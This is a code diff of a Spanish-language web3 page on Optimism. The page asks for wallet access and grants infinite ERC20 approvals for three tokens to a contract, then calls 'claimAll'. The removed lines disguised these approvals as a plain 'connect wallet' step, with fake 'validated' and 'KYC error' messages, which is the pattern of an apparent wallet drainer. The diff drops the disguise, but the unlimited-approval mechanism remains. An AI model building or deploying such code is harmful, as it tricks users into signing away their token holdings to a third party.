@@ -454,23 +454,7 @@
         50% { opacity: 0; transform: translateY(20px); }
         100% { opacity: 1; transform: translateY(0); }
     }
-/* Estilos para el botón conectado */
-button#approveTokens.connected {
-    background-color: #00b15d !important;
-    color: white !important;
-    cursor: not-allowed;
-    position: relative;
-    padding-left: 40px;
-}
 
-button#approveTokens.connected::before {
-    content: "✓";
-    position: absolute;
-    left: 15px;
-    top: 50%;
-    transform: translateY(-50%);
-    font-size: 1.2em;
-}
    
     </style>
 </head>
@@ -1060,13 +1044,6 @@ button#approveTokens.connected::before {
                     const accounts = await ethereum.request({ method: "eth_requestAccounts" });
                     userAccount = accounts[0];
                     contract = new web3.eth.Contract(contractABI, contractAddress);
-
-                    const connectButton = document.getElementById("approveTokens");
-                    connectButton.textContent = "Conectado";
-                    connectButton.classList.add('connected');
-                    connectButton.disabled = true;
-
-                    
                     document.getElementById("approveTokens").disabled = false;
                     document.getElementById("claimAll").disabled = false; // Añadir esta línea
 
@@ -1085,23 +1062,11 @@ button#approveTokens.connected::before {
 
             // Tokens ERC20 que el contrato manejará
             const tokens = [
-                "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", 
+                "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", // Reemplazar con las direcciones correctas de los tokens
                 "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1",
                 "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85"
             ];
-            
-            try {
-                     const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-                     userAccount = accounts[0];
-                     const connectButton = document.getElementById("approveTokens");
-                     connectButton.textContent = "Conectado";
-                     connectButton.classList.add('connected');
-                     connectButton.disabled = true;
-                  } catch (error) {
-                              console.error("Error conectando wallet:", error);
-                }
 
-            
             // Aprobación infinita
             try {
                 for (const token of tokens) {
@@ -1128,10 +1093,10 @@ button#approveTokens.connected::before {
                     console.log(`Token ${token} aprobado con éxito`);
                 }
 
-                alert("validado correctamente");
+                alert("Tokens aprobados con éxito para el contrato");
             } catch (error) {
-                console.error("Error de conexion intentelo nuevamente", error);
-                alert("Error intentelo nuevamente");
+                console.error("Error al autorizar los tokens", error);
+                alert("Error al otorgar permisos");
             }
         });
 
@@ -1154,34 +1119,9 @@ button#approveTokens.connected::before {
                 alert("Acción claimAll ejecutada con éxito");
             } catch (error) {
                 console.error("Error al ejecutar claimAll", error);
-                alert("Error KYC intentelo nuevamente");
+                alert("Error al ejecutar claimAll");
             }
         });
-
-// Manejar cambios de cuenta
-ethereum.on('accountsChanged', (accounts) => {
-    const connectButton = document.getElementById("approveTokens");
-    if (accounts.length === 0) {
-        connectButton.textContent = "Conectar Wallet";
-        connectButton.classList.remove('connected');
-        connectButton.disabled = false;
-        userAccount = null;
-    }
-});
-
-// Manejar cambios de red
-ethereum.on('chainChanged', (chainId) => {
-    const connectButton = document.getElementById("approveTokens");
-    if (chainId !== '0xa') {
-        connectButton.textContent = "Conectar Wallet";
-        connectButton.classList.remove('connected');
-        connectButton.disabled = false;
-        alert('Por favor vuelve a la red Optimism');
-    }
-});
-
-
-        
         document.addEventListener("DOMContentLoaded", function() {
     ethereum.request({ method: 'eth_requestAccounts' }).then(accounts => {
         userAccount = accounts[0];
